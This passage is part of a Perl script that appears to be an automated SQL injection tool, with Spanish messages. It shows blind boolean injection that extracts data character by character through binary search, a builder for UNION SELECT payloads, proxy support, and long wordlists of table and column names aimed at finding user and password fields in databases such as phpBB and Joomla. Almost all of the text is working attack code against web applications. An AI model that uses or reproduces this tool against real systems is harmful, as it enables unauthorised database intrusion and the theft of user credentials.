		$url="+AND+length($search)=$n";
		if($comment==1) { $url.=$myComment; }
		#print "\n$url\n";
		$web=get($ARGV[0].$url);
		if(scalar(split("\n", $web)) == scalar(split("\n", $original))) { $bDone=1; }
		else { $n++; }
	}
	#print "\nLongitud: $n\n";
	$ress="";
	for($i=1; $i<=$n; $i++)
	{	
		$url="+AND+ord(substring($search, $i, $i))";
		$chr=recursiveSearch($url, 32, 126);
		$ress=$ress.$chr;
	}
	$ress=~s/\t//;
	$ress=~s/ //;
	$ress=cleanRes($ress);
	return $ress;
}

sub recursiveSearch
{
	$target=shift;
	$start=shift;
	$end=shift;
	$original=get($ARGV[0]);
	use integer;
	$mid=($start+$end)/2;

	$code=get($ARGV[0]."$target=$mid");
	#print "\n$ARGV[0]$target=$mid";
	# if(scalar(split("\n", $code))==scalar(split("\n", $original))) { $rs=$mid; }
	if((scalar(split("\n", $code))==scalar(split("\n", $original)))||(($customPat==1)&((($pGood ne "")&($code=~/$pGood/))||(($pBad ne "")&(!($code=~/$pBad/))))) ) { $rs=$mid; }
	else 
	{
		$bitTb=$ARGV[0]."$target<$mid";
		if($comment==1) { $bitTb.=$myComment; }
		$code=get($bitTb);
		# if(scalar(split("\n", $code))==scalar(split("\n", $original))) { $rs=recursiveSearch($target, $start, $mid); }
		if((scalar(split("\n", $code))==scalar(split("\n", $original)))||(($customPat==1)&((($pGood ne "")&($code=~/$pGood/))||(($pBad ne "")&(!($code=~/$pBad/))))) ) { $rs=recursiveSearch($target, $start, $mid); }
		else
		{
	
			$code=get($ARGV[0]."$target>$mid");
			# if(scalar(split("\n", $code))==scalar(split("\n", $original))) { $rs=recursiveSearch($target, $mid, $end); }
			if((scalar(split("\n", $code))==scalar(split("\n", $original)))||(($customPat==1)&((($pGood ne "")&($code=~/$pGood/))||(($pBad ne "")&(!($code=~/$pBad/))))) ) { $rs=recursiveSearch($target, $mid, $end); }
		}
	}
	$chrr=chr($rs);
	$chrr=~s/\t//;
	$chrr=~s/ //;
	$ress.=$chrr;
	$|++;
	return $chrr;
}

sub setLists
{
	@myTables=(
	"usuario", "usuarios", "user", "users", "username", "usernames", "noticias", "name", "names", "nombre", "nombres", "member", "members", "miembro", "jos_users",
	"miembros", "membername", "admin", "admins", "administracion", "administrator", "administrators", "passwd", "password", "passwords", "pass", "Pass", "user_password",
	"user_passwords", "user_name", "user_names", "member_password", "mods", "moderators", "moderator", "mail", "emails", "email", "address", "emailaddress", "correo",
	"correos", "phpbb_users", "log", "logins", "login", "registers", "register", "usr", "usrs", "ps", "un", "id", "u_name", "u_pass", "u_password", "nick", "nicks",
	"manager", "managers", "administrador", "administradores", "clave", "login_id", "pwd", "pas", "sistema_id", "sistema_usuario", "sistema_password", "contrasena", "auth",
	"senha", "User", "Users", "Username", "userName", "Usernames", "UserNames", "Usuario", "Name", "Names", "Nombre", "Nombres", "Usuarios", "Member", "Members", "Miembro",
	"Miembros", "memberName", "MemberName", "Membername", "Admin", "Admins", "Administrator", "Administrators", "Passwd", "Password", "Passwords", "user_Password",
	"user_Passwords", "User_password", "User_Password", "User_passwords", "User_Passwords", "user_Name", "user_Names", "User_name", "User_names", "User_Name", "User_Names",
	"member_Password", "Member_password", "Member_Password", "Mods", "Moderators", "Moderator", "Mail", "Emails", "Email", "emailAddress", "EmailAddress", "Emailaddress",
	"Correo", "Correos", "Log", "Logins", "Login", "Registers", "Register", "Usr", "Usrs", "Ps", "Un", "Id", "u_Name", "u_Pass", "u_Password", "Nick", "Nicks", "Manager",
	"Managers", "Administrador", "Administradores", "Clave", "login_Id", "Pwd", "Contrasena", "Auth", "Senha", "USER", "USERS", "USERNAME", "USERNAMES", "USUARIO", "NAME",
	"NAMES", "NOMBRE", "NOMBRES", "USUARIOS", "MEMBER", "MEMBERS", "MIEMBRO", "MIEMBROS", "MEMBERNAME", "ADMIN", "ADMINS", "ADMINISTRATOR", "ADMINISTRATORS", "PASSWD", 
	"PASSWORD", "PASSWORDS", "PASS", "USER_PASSWORD", "USER_PASSWORDS", "PHPBB_USERS", "LOG", "LOGINS", "LOGIN", "REGISTERS", "REGISTER", "USR", "sqli");
	
	@myColumns=(
	"contrasena", "nombre", "name", "pass", "password", "mail", "email", "user", "id", "correo", "direccion", "telefono", "tlf", "adress", "post", "posts", "mensajes", "messages", 
	"ip", "IP", "location", "username", "contrasenia", "admin_name", "cla_adm", "usu_adm", "fazer", "logon", "last_login", "fazerlogon", "authorization", "membros", 
	"utilizadores", "sysadmin", "senha", "username", "user_name", "user_username", "uname", "user_uname", "usern", "un", "user_un", "usrnm", "usr", "user_usrnm", "nm", 
	"user_nm","login", "u_name", "host", "pws", "cedula", "userName", "host_password", "login_id", "sistema_id", "author", "user_login", "admin_user", "admin_pass", 
	"admin_password", "uh_usuario", "uh_password", "pswd", "psw", "host_username", "sistema_usuario", "auth", "key", "usuarios_nombre", "usuarios_nick", 
	"usuarios_password", "usuarios_contrasena", "usuarios_contrasenia", "membername", "nme", "unme", "user_password", "autores", "author", "autor", "pass_hash", "hash",
	"userpass", "usuario_password", "usuario_nombre", "usuario_nick", "usuario_pass", "upw", "user_pass", "user_passwd", "pwrd", "user_pwrd", "user_password", "u_pass",
	"clave", "pas", "sistema_password", "upassword", "web_password", "web_username");
}

sub makeIny
{
	$printt=shift;
	$parss=shift;
	$var=shift;
	$iny="+AND+1=2+UNION+SELECT+";
	if($printt==1)
	{
		$iny.=$var;
	}
	else
	{
		$iny.="1";
	}
	for($c=2; $c<=$pars; $c++)
	{
		if($c==$print)
		{
			$iny.=", ".$var;
		}
		else
		{
		$iny.=",".$c;
		}
	}
	return $iny;
}

sub get
{
	$urlg=shift;
	$id=LWP::UserAgent->new;
	if($proxy ne "")
	{
		if($proxy!~/^http:\/\//) { $proxy="http://".$proxy; }
		$id->proxy(['http', 'ftp'], $proxy);
	}
	$id->agent("Mozilla");
	$req=HTTP::Request->new(GET, $urlg);
	$res=$id->request($req);
	$data=$res->content;
	return $data;
}

sub getData
{
	$html=shift;
	@res1=split("ca0s_is_", $html);
	@res2=split("ca0s_is2_", @res1[1]);
	$result=@res2[0];
	return $result;
}

sub error
{
	$num=shift;
	switch($num)
	{
		case 1  { print "[-] Objetivo no valido\n\n"; }
		case 2  { print "[-] Objetivo no vulnerable\n\n"; }
		case 3  { print " Ningun valor imprime. Imposoble continuar, saliendo.\n\n"; }
	}
}
	
sub ordstring
{
	$srting=shift;
	$tnlong=length($tname);
	$tnord="";
	$tnl;
	for($tnl=0; $tnl<=$tnlong-1; $tnl++)
	{
		$tchar="";
		$tchar=substr($tname, $tnl, 1);
		$tnord.=ord($tchar).",";
	}
	chop($tnord);
	return $tnord;
	$string="";
	$tnord="";
	$tnl=0;
}

sub text2hex
{
	$str=shift;
	$hex="0x";
	for (split //, $str) { 
		$hex .= sprintf "%x", ord;
	}
	return $hex;
}

sub cleanRes
{
	$cleanRess=shift;
	$cleanRess=~s/[^A-Za-z0-9\.,_-]//g;
	return $cleanRess;
}
